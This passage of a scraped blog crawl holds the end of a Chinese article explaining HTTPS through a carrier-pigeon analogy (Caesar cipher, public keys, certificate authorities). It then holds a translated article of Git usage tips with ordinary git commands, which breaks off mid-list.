来发送我的银行资信证明的，并且你也不应如此。</p>\n<p><strong>隐蔽的密码</strong></p>\n<p>那么如果爱丽丝和鲍勃都非常的机智。他们一致认同使用一种隐蔽的密码来书写他们的信息。他们会将信息中的每个字母按照字母表中的顺序前移三位。比如，D→A，E→B，F→C。如此一来，原文为 “secret message” 的信息就变成了 “pbzobq jbppxdb” 。</p>\n<p>那现在如果马洛里再截获了信鸽，她既不能做出有意义的修改同时也不会知道信息的内容，因为她不知道隐蔽的密码到底是什么。然而鲍勃却可以很容易反转密码，依靠 A → D, B → E, C → F 之类的规则破译信息的内容。加密后的信息 “pbzobq jbppxdb” 会被破解还原为 “secret message” 。</p>\n<p>搞定！</p>\n<p>这就是<strong>对称密匙加密</strong>，因为如果你知道如何加密一段信息那么你同样可以解密这段信息。</p>\n<p>上述的密码通常被称为凯撒码。在现实生活中，我们会使用更为奇特和复杂的密码，但原理相同。</p>\n<p><strong>我们如何决定密匙？</strong></p>\n<p>如果除了发信者和收信者之外没有人知道使用的是什么密匙，对称密匙加密是非常安全的。在凯撒加密中，密匙就是每个字母变到加密字母需要移动多少位的偏移量。我之前的距离中，使用的偏移量是 3 ，但是也可以用 4 或者 12 。</p>\n<p>问题是如果爱丽丝和鲍勃在开始用信鸽传信之前没有碰过头，他们没有一个安全的方式来确立密匙。如果他们自己来在信中传递密匙，马洛里就会截获信息并发现密匙。这就使得马洛里可以在爱丽丝和鲍勃开始加密他们的信息之前或之后，阅读到他们信息的内容并按照她的意愿来篡改信息。</p>\n<p>这是一个<strong>中间人攻击</strong>的典型例子，避免这个问题的唯一方法就是收发信的两方一起修改他们的编码系统。</p>\n<p><strong>通过信鸽传递盒子</strong></p>\n<p>所以爱丽丝和鲍勃就想出了一个更好的系统。当鲍勃想要给爱丽丝发送信息时，他会按照如下的步骤来进行：</p>\n<ul>\n<li>鲍勃向爱丽丝送一只没有携带任何信息的鸽子。</li>\n<li>爱丽丝给鲍勃送回鸽子，并且这只鸽子带有一个有开着的锁的盒子，爱丽丝保管着锁的钥匙。</li>\n<li>鲍勃把信放进盒子中，把锁锁上然后把盒子送给爱丽丝。</li>\n<li>爱丽丝收到盒子，用钥匙打开然后阅读信息。</li>\n</ul>\n<p>这样马洛里就不能通过截获鸽子来篡改信息了，因为她没有打开盒子的钥匙。当爱丽丝要给鲍勃发送消息的时候同样按照上述的流程。</p>\n<p>爱丽丝和鲍勃所使用的流程通常被称为<strong>非对称密钥加密</strong>。之所以称之为非对称，是因为即使是你把信息编码（锁上盒子）也不能破译信息（打开锁住的盒子）。</p>\n<p>在术语中，盒子被称为<strong>公匙</strong>而用来打开盒子的钥匙被称为<strong>私匙</strong>。</p>\n<p><strong>如何信任盒子</strong></p>\n<p>如果你稍加注意你就会发现还是存在问题。当鲍勃收到盒子时他如何能确定这个盒子来自爱丽丝而不是马洛里截获了鸽子然后换了一个她有钥匙能打开的盒子呢？</p>\n<p>爱丽丝决定签名标记一下盒子，这样鲍勃收到盒子的时候就可以检查签名来确定是爱丽丝送出的盒子了。</p>\n<p>那么你们之中的一些人可能就会想了，鲍勃如何打一开始就能识别出爱丽丝的签名呢？这是个好问题。爱丽丝和鲍勃也确实有这个问题，所以他们决定让泰德代替爱丽丝来标记这个盒子。</p>\n<p>那么谁是泰德呢？泰德很有名的，是一个值得信任的家伙。他会给任何人签名并且所有人都信任他只会给合法的人签名标记盒子。</p>\n<p>如果泰德可以确认索要签名的人是爱丽丝，他就会在爱丽丝的盒子上签名。因此马洛里就不可能搞到一个有着泰德代表爱丽丝签了名的盒子，因为鲍勃知道泰德只会给他确认过的人签名，从而识破马洛里的诡计。</p>\n<p>泰德的角色在术语中被称为<strong>认证机构</strong>。而你阅读此文时所用的浏览器打包存有许多认证机构的签名。</p>\n<p>所以当你首次接入一个网站的时候你可以信任来自这个站点的盒子因为你信任泰德而泰德会告诉你盒子是合法的。</p>\n<p>沉重的盒子</p>\n<p>现在爱丽丝和鲍勃有了一个可靠的系统来进行交流，然他们也意识到让鸽子携带盒子比原本只携带信件要慢一些。</p>\n<p>因此他们决定只有在选择用对称加密来给信息编码（还记得凯撒加密法吧？）的密匙时，使用传递盒子的方法（非对称加密）。</p>\n<p>这样就可以二者的优点兼具了，非对称加密的可靠性和对称加密的高效性。</p>\n<p>现实世界中我们不会用信鸽这样慢的送信手段，但用非对称加密来编码信息仍要慢于使用对称加密技术，所以我们只有在交换编码密匙的时候会使用非对称加密技术。</p>\n<p>现在你已经了解了HTTPS是如何工作的了，你的咖啡也应该准备好了。好好享用吧你受之无愧。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113883\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113883votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113883\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,HTTPS", "url": "http://blog.jobbole.com/113883/", "url_obj_id": "9b7fbbbdabdb7fefb5606fee9d447604"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/04/e38d25144c3ef2d81d73a884cacbf9c2.jpg"], "title": "Git 12 岁了，为你送上 12 个 Git 的使用技巧！", "create_date": "2018/04/16 ·", "praise_num": 1, "fav_num": 6, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://opensource.com/article/18/4/git-tips\">opensource.com</a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/translate/12-git-tips-gits-12th-birthday\">开源中国</a>   </div><p>使用这12个Git的诀窍与技巧来令你的版本控制经验更加有用。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/04/e38d25144c3ef2d81d73a884cacbf9c2.jpg\"></p>\n<p>Git，一个分布式版本控制系统，它已经成为了开源世界的源码控制默认工具，在4月7号12岁了。但是使用Git中更另人沮丧的是，你需要了解多少才能让你更有效的使用它。同时这也是使用Git中比较美妙的一件事，因为没有什么比发现一个新的小技巧来简化或提高你的工作流的效率更加令人快乐了。</p>\n<p>为了纪念Git的12岁生日，这篇文章提供12个诀窍与技巧来让你的Git经验更加有用和强大，从一些你可能会忽视的基础开始到一些真正的强大技巧!</p>\n<ol>\n<li>\n<h3>你的 ~/.gitconfig 文件</h3>\n</li>\n</ol>\n<p>在第一次用git命令来提交一个仓库的修改，你可能会首先看到像下面这种内容：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a8228bae2b993902464\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n*** Please tell me who you are.\r\nRun\r\n  git config --global user.email \"you@example.com\"\r\n  git config --global user.name \"Your Name\"\r\nto set your account's default identity.</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a8228bae2b993902464-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a8228bae2b993902464-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a8228bae2b993902464-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a8228bae2b993902464-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a8228bae2b993902464-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a8228bae2b993902464-1\"><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span> <span class=\"crayon-i\">Please</span> <span class=\"crayon-i\">tell</span> <span class=\"crayon-i\">me</span> <span class=\"crayon-i\">who</span> <span class=\"crayon-i\">you</span> <span class=\"crayon-v\">are</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a8228bae2b993902464-2\"><span class=\"crayon-i\">Run</span></div><div class=\"crayon-line\" id=\"crayon-5b4a8228bae2b993902464-3\">  <span class=\"crayon-i\">git</span> <span class=\"crayon-i\">config</span> <span class=\"crayon-o\">--</span><span class=\"crayon-m\">global</span> <span class=\"crayon-v\">user</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">email</span> <span class=\"crayon-s\">\"you@example.com\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a8228bae2b993902464-4\">  <span class=\"crayon-i\">git</span> <span class=\"crayon-i\">config</span> <span class=\"crayon-o\">--</span><span class=\"crayon-m\">global</span> <span class=\"crayon-v\">user</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">name</span> <span class=\"crayon-s\">\"Your Name\"</span></div><div class=\"crayon-line\" id=\"crayon-5b4a8228bae2b993902464-5\"><span class=\"crayon-st\">to</span> <span class=\"crayon-i\">set</span> <span class=\"crayon-i\">your</span> <span class=\"crayon-i\">account</span>'<span class=\"crayon-i\">s</span> <span class=\"crayon-st\">default</span> <span class=\"crayon-v\">identity</span><span class=\"crayon-sy\">.</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n<p>你可能还没有意识到那些命令正在修改~/.gitconfig文件的内容，这个文件就是Git存储全局配置选项的文件。通过你的~/.gitconfig文件你可要做很多事情，包括定义别名，永久的打开（或关闭）一些特定的命令选项，还可以修改Git如何工作的方面（例如：git diff使用哪个diff算法，或者默认使用什么类型的的合并策略）。你甚至可以按条件地基于路径包含其他配置文件到一个仓库！使用“man git-config”查看所有细节。</p>\n<h3>2. 你的仓库的.gitconfig文件</h3>\n<p>在之前的技巧中，你可能会想知道在git config 命令中的—global标识是做什么的。它告诉Git更新“global”配置，也就是~/.gitconfig发现的这个配置。当然，拥有一个全局的配置代表了一个本地配置，而且足够肯定的是，如果你省略—global选项，git config 会更新这个仓库自己的配置，这个配置文件存储在.git/config。<br>\n在.git/config中设置的选项会推翻在~/.gitconfig文件中的对应设置。因此，例如，如果你需要在一个特定的仓库中使用一个不同的邮箱地址，你可以运行“git config user.email “also_you@example.com””。然后，你在这个仓库中提交会使用你单独配置的这个邮箱地址。如果你使用一个工作的电脑在开源项目中工作，但是希望在这个项目中使用个人的邮箱地址，而其他在主Git配置中仍然使用工作邮箱，这一点是非常有用的。<br>\n在~/.gitconfig中可以设置的任何东西，都可以在.git/config中设置来对这个仓库做特定设置。在下面的这些技巧中，当我提到在你的~/.gitconfig文件中添加什么东西，同时也说明可以在特定的仓库的.git/config中添加来设置那个选项。</p>\n<h3>3、别名</h3>\n<p>别名是你可以在你的~/.gitconfig文件里做的另外一件事。他的工作原理就像shell命令行里的别名——设置一个新的命令名称来调用一个或者多个其他的命令，这些命令通常包括一些特定的选项或标识。别名对于你经常使用的那些又长又复杂的命令行是非常有效的。</p>\n<p>你可以使用git config命令来定义别名——例如，执行”git config —global —add <a href=\"http://alias.st/\" rel=\"nofollow\">alias.st</a> status”命令后，会使得执行git st与执行git status做的是同样的事情——然而，我发现当定义别名的时候，只需要直接在~/.gitconfig文件里编辑通常会更加容易。</p>\n<p>如果你选择这么做，你会发现~/.gitconfig文件就是一个INI文件，INI是一种带有特定段落的基础键值对文件格式。添加一个别名时，你将改变[alias]段落。例如：上面提到的定义相同的git st别名，需要添加下面这段代码：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a8228bae36214166352\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[alias]\r\nst = status</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a8228bae36214166352-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a8228bae36214166352-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a8228bae36214166352-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">alias</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a8228bae36214166352-2\"><span class=\"crayon-i\">st</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-v\">status</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>（如果已经有了[alias]这个段落，只需要在这个段落中添加到第二行）</p>\n<h3>4. shell命令中的别名</h3>\n<p>别名不仅仅是运行其他Git子命令——你也可以定义别名，这些别名可以运行其他shell命令。这是一个很好的方法来处理一个重复的、罕见的、复杂的任务：一旦你已经想到第一次怎么做，那就使用一个别名保存这个命令。例如，我有几个仓库是我fork了一个开源项目，而且在本地做了一些修改，这些修改不用贡献给这个项目。在项目的持续的开发的过程中我想保持最新的版本，同时保留我的本地修改。为了完成这个想法，我需要定期地从upstream仓库中合并这些修改到我的fork——我定义一个别名“upstream-merge”来完成这个操作。定义如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a8228bae3b836972094\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nupstream-merge = !\"git fetch origin -v &amp;&amp; git fetch upstream -v &amp;&amp; git merge upstream/master &amp;&amp; git push\"</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a8228bae3b836972094-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a8228bae3b836972094-1\"><span class=\"crayon-v\">upstream</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">merge</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-o\">!</span><span class=\"crayon-s\">\"git fetch origin -v &amp;&amp; git fetch upstream -v &amp;&amp; git merge upstream/master &amp;&amp; git push\"</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>别名定义开始的这个“!”是告诉Git来通过shell运行这个命令。这个例子包括了运行一些git命令，但是使用这种方式定义别名可以运行任何shell命令。<br>\n（注意：如果你想复制我的upstream-merge别名，你将需要确认你有一个Git remote命名为upstream来指定这个你fork的upstream仓库。你可以通过“git remote add upstream &lt;URL to repo&gt;”来添加一个。）</p>\n<h3>5. 可视化提交图</h3>\n<p>如果你从事的是一个有很多分支活动的项目，有时可能很难掌握所有正在发生的工作以及它们之间的相关性。各种GUI工具可让你弄清楚不同分支的概况以及在所谓的“提交图”中提交记录。例如，以下是我使用<a href=\"https://gitlab.com/\" target=\"_blank\" rel=\"nofollow\">GitLab</a>提交图查看器进行可视化的一个存储卡的部分截图：<br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/04/5dd3991f489b7311925ad56455d62ba1.png\"></p>\n<p>John Anderson, CC BY</p>\n<p>如果你是专注于命令行的用户，就可以不在多个工具之间切换导致分心，这个工具在命令行上实现了类似图形界面的提交视图。通过 –graph 参数获取 git 的记录：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/04/1ba96822e6f6beb6bca67ca9a19525af.png\"></p>\n<p>John Anderson, CC BY</p>\n<p>下面的命令可以得到一样的仓库可视化片段：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a8228bae3f311974782\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset' --abbrev-commit --date=relative</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a8228bae3f311974782-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a8228bae3f311974782-1\"><span class=\"crayon-i\">git</span> <span class=\"crayon-i\">log</span> <span class=\"crayon-o\">--</span><span class=\"crayon-i\">graph</span> <span class=\"crayon-o\">--</span><span class=\"crayon-v\">pretty</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">format</span><span class=\"crayon-o\">:</span><span class=\"crayon-s\">'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset'</span> <span class=\"crayon-o\">--</span><span class=\"crayon-v\">abbrev</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">commit</span> <span class=\"crayon-o\">--</span><span class=\"crayon-v\">date</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">relative</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>–graph 选项将图表添加到日志的左侧，–abbrev-commit 存储提交使用了 <a href=\"https://en.wikipedia.org/wiki/Secure_Hash_Algorithms\" target=\"_blank\" rel=\"nofollow\">SHA</a> 方法，          –date=relative 表达式用相对的术语来表示日期，并且  –pretty 以 bit 格式处理自定义格式。我知道 git lg 的别名，它是我最常运行的10个命令之一。</p>\n<h3>6. 更优雅的强制推送(force-push)</h3>\n<p>有时，就跟你尽量避免使用它一样困难的是，你会发现你需要运行 git push –force 来覆写你仓库的远程副本上的历史记录。你可能已得到了一些反馈，他们会要求你进行交互式的变基(rebase)，或者你可能已经搞砸了，并且希望隐藏证据。</p>\n<p>当他人在仓库的远程副本的同一分支上进行改动后，会发生强制推送的风险。当你强制推送已重写的历史记录时，某些提交将会丢失。这是 git push –force-with-lease 出现的原因 – 如果远程分支已更新，它不会允许你执行强制推送，这将确保你不会丢弃他人的工作。</p>\n<h3>7. git add -N</h3>\n<p>你是否使用过git commit -a在一次行动中提交你所有未完成的修改，只有在你push完你的提交后才发现git commit -a忽略了新添加的文件？解决这个问题你可以用git add -N（“通知”）来告诉Git你想把新添加的文件包含在提交中在你第一次实际提交之前。</p>\n<h3>8. git add -p</h3>\n<p>一最佳的实践为当使用Git时确保每个提交只包含一个逻辑更改–不管是修复一个bug还是（实现）一个新功能。然而，有时当你工作，会在你的仓库中出现一个以上的修改提交。你怎么样把事情分开，使每个提交只包含适当的修改呢？git add –patch来解救！</p>\n<p>这个标志将会使git add命令查看你工作副本中所有的变更，询问你是否愿意将它提交，跳过，或者推迟决定（还有其他一些更强大的选项，你可以通过在运行这命令后选择？来查看）。git add -p是一个神奇的工具来生产结构良好的提交。</p>\n<h3>9. git checkout -p</h3>\n<p>与 git add -p类似，git checkout命令将使用 –patch 或 -p 选项，这会使 git 在本地工作副本中展示每个“大块”的改动，并允许丢弃对应改动 —— 简单地说就是恢复本地工作副本到你改变之前的状态。</p>\n<p>某些场景下这非常有用，例如，在你跟踪一个 bug 时引入了一堆调试日志语句，在修正了这个 bug 之后，你可以先使用 git checkout -p 删除所有新加的调试日志，之后使用 git add -p 来添加 bug 修复。没有比组合一个极好的、结构良好的提交更令人满意的了！</p>\n<h3>10. Rebase with command execution</h3>\n<p>有些项目有一条规则，即存储库中的每个提交都必须处于可工作状态 – 也就是说，在每次提交时，代码应该是可编译的，或运行测试套件应该不会失败的。当你在某分支上工作时间长时，但如果你最终因为某种原因需要rebase时，那么跳过每个变基后的提交以确保你没有意外引入一个中断是有些冗长乏味的。</p>\n<p>幸运的是，git rebase已经支持了-x或–exec选项。git rebase -x &lt;cmd&gt;将在每次提交应用到rebase后运行该命令。因此，例如，如果你有一个项目，其中npm run tests会运行你的测试套件，那么在rebase期间应用每次提交后，git rebase -x npm run tests将会运行测试套件。这使你可以查看测试套件是否在任何变基后的提交中有失败情况，因此你可以确保测试套件在每次提交时仍能通过。</p>\n<h3>11. 基于时间修改的指南</h3>\n<p>很多Git子命令都接受一个修正的参数来决定命令作用于仓库的哪个部分，可能是某次特定的提交的 sha1 值，或者一个分支的名称，又或者是一个符号性的名称如 HEAD（代表当前检出分支最后一次的提交），除了这些简单的形式以外，你还可以附加一个指定的日期或时间作为参数，表示“这个时间的引用”。</p>\n<p>这个功能在某些时候会变得十分有用，比如当你处理最新出现的 bug，自言自语道：“这个功能明明昨天还是好好的，到底又改了些什么”，不用盯着满屏的 git 日志的输出试图弄清楚什么时候更改了提交，您只需运行 git diff HEAD@{yesterday}，会看到从昨天以来的所有修改，这也适用于较长的时间段（例如 git diff HEAD@{‘2 months ago’}） ，以及一个确切的日期（例如git diff HEAD@{‘2010-01-01 